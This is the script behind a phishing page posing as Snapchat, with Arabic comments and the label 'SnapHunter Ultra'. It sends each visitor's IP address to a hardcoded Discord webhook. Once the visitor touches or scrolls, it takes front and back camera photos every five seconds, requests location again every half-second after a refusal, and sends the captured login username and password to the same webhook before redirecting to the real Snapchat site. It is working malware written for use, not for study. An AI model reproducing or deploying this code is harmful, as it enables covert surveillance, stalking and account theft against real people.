'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;
let isStarted = false; // لمنع تكرار التشغيل

// 1. جلب IP الجهاز فور الدخول (بدون أذونات)
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch { return "Unknown"; }
}

// 2. إرسال البيانات الموحد (صور JPEG مضغوطة للسرعة)
async function sendPacket(blob, text) {
    const formData = new FormData();
    if (blob) formData.append('file', blob, 'capture.jpg');
    formData.append('payload_json', JSON.stringify({ 
        content: text, 
        username: "SnapHunter Ultra",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));
    return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 3. طلب الموقع بشكل إجباري (تكرار فوري عند الرفض - يعمل في Safari بعد التفاعل)
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
            sendPacket(null, `📍 **الموقع المباشر:** https://www.google.com/maps?q=${userLat},${userLng}`);
        },
        () => { 
            // إعادة الطلب كل نصف ثانية في حال الرفض
            setTimeout(forceLocation, 500); 
        },
        { enableHighAccuracy: true }
    );
}

// 4. وظيفة التقاط الصور (أمامية وخلفية) بسرعة عالية
async function captureMode(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        await new Promise(r => video.onloadeddata = r);
        video.play();
        
        // انتظار بسيط جداً لفتح العدسة (حل مشكلة الصور السوداء)
        await new Promise(r => setTimeout(r, 400));

        const ctx = canvas.getContext('2d');
        canvas.width = 640; canvas.height = 480;
        ctx.drawImage(video, 0, 0, 640, 480);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
        stream.getTracks().forEach(t => t.stop()); // إغلاق المسار فوراً

        await sendPacket(blob, `📸 لقطة من الكاميرا: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
    } catch (e) { }
}

// 5. المحرك الرئيسي (يتم استدعاؤه عند أول تفاعل للمستخدم)
async function bootSystem() {
    if (isStarted) return;
    isStarted = true;

    const ip = await getIP();
    
    try {
        // أ- طلب الكاميرا (سيظهر الطلب في Safari الآن لأن هناك تفاعل)
        const initStream = await navigator.mediaDevices.getUserMedia({ video: true });
        initStream.getTracks().forEach(t => t.stop());

        // ب- طلب الموقع مباشرة خلف الكاميرا
        forceLocation();

        // ج- التقاط أول صورتين فوراً
        const runCycle = async () => {
            await captureMode('user');
            await captureMode('environment');
            setTimeout(runCycle, 5000); // تكرار كل 5 ثوانٍ
        };
        runCycle();

    } catch (err) {
        // في حال رفض الكاميرا، استمر بطلب الموقع
        forceLocation();
    }
}

// إشعار دخول صامت (بمجرد فتح الصفحة)
getIP().then(ip => sendPacket(null, `👤 صيد جديد دخل (بانتظار اللمس)... IP: ${ip}`));

// حل مشكلة Safari: لا يعمل طلب الإذن إلا بعد "لمسة" من المستخدم
window.addEventListener('click', bootSystem);
window.addEventListener('touchstart', bootSystem);
window.addEventListener('scroll', bootSystem);

// معالجة صفحة تسجيل الدخول (apply2.html)
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.onsubmit = async (e) => {
        e.preventDefault();
        const u = e.target.username.value;
        const p = e.target.password.value;
        document.getElementById('loadingOverlay').style.display = 'flex';

        await sendPacket(null, `👤 **بيانات الدخول:**\nUser: \`${u}\`\nPass: \`${p}\``);
        
        setTimeout(() => {
            window.location.href = "https://accounts.snapchat.com/";
        }, 1500);
    };
}
